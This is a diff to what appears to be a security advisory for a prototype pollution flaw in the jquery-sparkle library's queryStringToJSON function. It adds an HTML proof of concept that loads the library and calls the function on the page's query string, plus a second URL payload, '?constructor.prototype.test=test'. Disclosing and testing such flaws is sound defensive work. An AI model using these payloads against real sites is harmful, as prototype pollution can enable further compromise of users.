@@ -87,6 +87,14 @@ String.prototype.queryStringToJSON = String.prototype.queryStringToJSON || funct
 ```
 
 ### PoC
+```html
+<script src="https://code.jquery.com/jquery-2.2.4.js"></script>
+<script src="https://raw.githack.com/bevry-archive/jquery-sparkle/1cf0bd0ab37372ea9c22c189e8bc2b9504329622/scripts/jquery.sparkle.js"></script>
+<script>
+  location.search.queryStringToJSON();
+</script>
+```
 ```
 ?__proto__.test=test
+?constructor.prototype.test=test
 ```
